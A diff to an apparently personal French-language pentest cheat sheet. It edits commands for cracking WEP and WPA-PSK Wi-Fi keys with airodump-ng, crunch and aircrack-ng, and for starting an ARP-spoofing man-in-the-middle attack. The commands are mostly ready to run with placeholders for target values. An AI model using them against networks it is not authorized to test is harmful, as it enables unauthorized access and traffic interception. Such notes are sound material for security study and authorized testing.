@@ -1278,7 +1278,7 @@ sudo aireplay-ng -9 -e {SSID} -a {MAC point d'accès} {Nom carte Wifi}
 
 * Récupérer les vecteurs d'initialisation pour l'algorithme de cassage :
 ```
-sudo airodump-ng -c 3 --bssid {MAC point d'accès} -w output {Nom carte Wifi}
+sudo airodump-ng -c {Canal Wifi} --bssid {MAC point d'accès} -w output {Nom carte Wifi}
 ```
 
 * Associer la carte Wifi et le point d'accès :
@@ -1308,26 +1308,26 @@ sudo apt-get install aircrack-ng pciutils crunch
 sudo airmon-ng start {Nom carte Wifi}
 ```
 
-* Lancer une écoute de tout les paquets Wifi qui circulent :
+* Lancer une écoute de tous les paquets Wifi qui circulent :
 ```
 sudo airodump-ng {Nom carte Wifi}
 ```
 
 * Cibler la recherche vers le point d'accès :
 ```
-airodump-ng -c 3 --bssid {MAC point d'accès} -w psk {Nom carte Wifi}
+sudo airodump-ng -c {Canal Wifi} --bssid {MAC point d'accès} -w psk {Nom carte Wifi}
 ```
 
 Il faut attendre de récupérer les données issues d'un handshake (émis lors de la connexion d'un utilisateur au PA).
 
 * Créer un dictionnaire de toutes les combinaisons décimales possibles sur 8 bits :
 ```
-crunch 8 8 0123456789 -o dictionnaire
+sudo crunch 8 8 0123456789 -o dictionnaire
 ```
 
 * Cassage de la PSK :
 ```
-aircrack-ng -w dictionnaire -b {MAC point d'accès} psk*.cap
+sudo aircrack-ng -w dictionnaire -b {MAC point d'accès} psk*.cap
 ```
 
 ## Attaque du type "homme du milieu" par usurpation ARP
@@ -1336,7 +1336,7 @@ Sur la machine qui effectue l'attaque :
 
 * Activer le routage IPv4 :
 ```
-sysctl -w net.ipv4.ip_forward=1
+sudo sysctl -w net.ipv4.ip_forward=1
 ```
 
 * Lancer l'empoisonnement du cache ARP de la victime :
